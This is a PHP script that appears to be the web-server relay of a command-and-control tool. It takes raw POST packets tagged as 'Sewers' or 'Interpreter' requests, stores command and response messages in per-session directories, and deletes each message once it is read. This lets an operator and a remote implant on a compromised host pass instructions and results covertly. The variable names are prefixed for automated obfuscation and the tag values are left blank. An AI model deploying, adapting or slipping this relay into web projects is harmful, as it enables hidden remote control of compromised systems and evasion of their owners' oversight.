<?php

// Set variables

	$obf_var_res_dir = "";
	$obf_var_req_dir = "";
	$obf_var_sewers_post_tag = "";
	$obf_var_sewers_get_tag = "";
	$obf_var_interpreter_post_tag = "";
	$obf_var_interpreter_get_tag = "";
	$obf_var_packet = file_get_contents("php://input");
	$obf_var_split_packet = explode("\n", $obf_var_packet);
	if ( isset($obf_var_split_packet[0]) && isset($obf_var_split_packet[1]) ) {
		$obf_var_req_type = $obf_var_split_packet[0];
		$obf_var_session_id = $obf_var_split_packet[1];
	}
	$obf_var_body = implode( "\n", array_slice( explode("\n", $obf_var_packet), 2 ) );
	$obf_var_body = rtrim($obf_var_body, "\n");

// Debug packet

	// ob_start();
	// var_dump("\n========PACKET========\n" . $obf_var_req_type . "\n" . $obf_var_session_id . "\n" . $obf_var_body . "\n======================\n");
	// error_log( ob_get_clean(), 4 );

// Set functions

	function obf_func_randString() {
		$obf_var_chars = "abcdefghijklmnopqrstuvwxyz";
		$obf_var_charsLength = strlen($obf_var_chars);
		$obf_var_buffer = "";
		while ( strlen($obf_var_buffer) < 16 ) {
			$obf_var_buffer .= $obf_var_chars[rand(0, $obf_var_charsLength - 1)];
		}
		return $obf_var_buffer;
	}

	function obf_func_scanDir($obf_var_path) {
		return array_diff( scandir($obf_var_path), array(".", "..") );
	}

	function obf_func_writeFile($obf_var_path, $obf_var_body) {
		$obf_var_last = 0;
		$obf_var_neighbours = obf_func_scanDir($obf_var_path);
		foreach ($obf_var_neighbours as $obf_var_neighbour) {
			$obf_var_neighbour > $obf_var_last ? $obf_var_last = $obf_var_neighbour : "";
		}
		$obf_var_new = $obf_var_last + 1;
		$obf_var_writefile = $obf_var_path . "/" . $obf_var_new;
		$obf_var_handle = fopen($obf_var_writefile, "w") or die("Cannot create file:  " . $obf_var_writefile);
		fwrite($obf_var_handle, $obf_var_body);
		fclose($obf_var_handle);
	}

// Parse packet

	if ( !is_dir("./" . $obf_var_res_dir) ) {
		mkdir("./" . $obf_var_res_dir);
	}

	if ( !is_dir("./" . $obf_var_req_dir) ) {
		mkdir("./" . $obf_var_req_dir);
	}

	// Sewers GET request
	if ( $obf_var_req_type == $obf_var_sewers_get_tag && $obf_var_session_id != "" ) {
		if ( is_dir("./" . $obf_var_res_dir . "/" . $obf_var_session_id) ) {
			if ($obf_var_body == "") {
				echo join( ",", obf_func_scanDir("./" . $obf_var_res_dir . "/" . $obf_var_session_id) );
			} else {
				if ( is_file("./" . $obf_var_res_dir . "/" . $obf_var_session_id . "/" . $obf_var_body) ) {
					echo file_get_contents("./" . $obf_var_res_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
					unlink("./" . $obf_var_res_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
				} else {
					http_response_code(404);
					die();
				}
			}
		} else {
			http_response_code(404);
			die();
		}
	} elseif ( $obf_var_req_type == $obf_var_sewers_get_tag && $obf_var_session_id == "" ) {
		echo join( ",", obf_func_scanDir("./" . $obf_var_res_dir) );
	}

	// Sewers POST request
	if ( $obf_var_req_type == $obf_var_sewers_post_tag && isset($obf_var_session_id) ) {
		if ( !is_dir("./" . $obf_var_req_dir . "/" . $obf_var_session_id) ) {
			mkdir("./" . $obf_var_req_dir . "/" . $obf_var_session_id);
		}
		obf_func_writeFile("./" . $obf_var_req_dir . "/" . $obf_var_session_id, $obf_var_body);
	}

	// Interpreter GET request
	if ($obf_var_req_type == $obf_var_interpreter_get_tag && $obf_var_session_id != "" ) {
		if ( !is_dir("./" . $obf_var_res_dir . "/" . $obf_var_session_id) ) {
			mkdir("./" . $obf_var_res_dir . "/" . $obf_var_session_id);
		}
		if ( !is_dir("./" . $obf_var_req_dir . "/" . $obf_var_session_id) ) {
			mkdir("./" . $obf_var_req_dir . "/" . $obf_var_session_id);
		}
		if ($obf_var_body == "") {
			$obf_var_req_dir_entries = obf_func_scanDir("./" . $obf_var_req_dir . "/" . $obf_var_session_id);
			if ( count($obf_var_req_dir_entries) > 0 ) {
				echo join(",", $obf_var_req_dir_entries);
			} else {
				http_response_code(404);
				die();
			}
		} else {
			if ( is_file("./" . $obf_var_req_dir . "/" . $obf_var_session_id . "/" . $obf_var_body) ) {
				echo file_get_contents("./" . $obf_var_req_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
				unlink("./" . $obf_var_req_dir . "/" . $obf_var_session_id . "/" . $obf_var_body);
			} else {
				http_response_code(404);
				die();
			}
		}
	}

	// Interpreter POST request
	if ($obf_var_req_type == $obf_var_interpreter_post_tag && isset($obf_var_session_id) ) {
		if ( !is_dir("./" . $obf_var_res_dir . "/" . $obf_var_session_id) ) {
			mkdir("./" . $obf_var_res_dir . "/" . $obf_var_session_id);
		}
		if ( !is_dir("./" . $obf_var_req_dir . "/" . $obf_var_session_id) ) {
			mkdir("./" . $obf_var_req_dir . "/" . $obf_var_session_id);
		}
		obf_func_writeFile("./" . $obf_var_res_dir . "/" . $obf_var_session_id, $obf_var_body);
	}

?>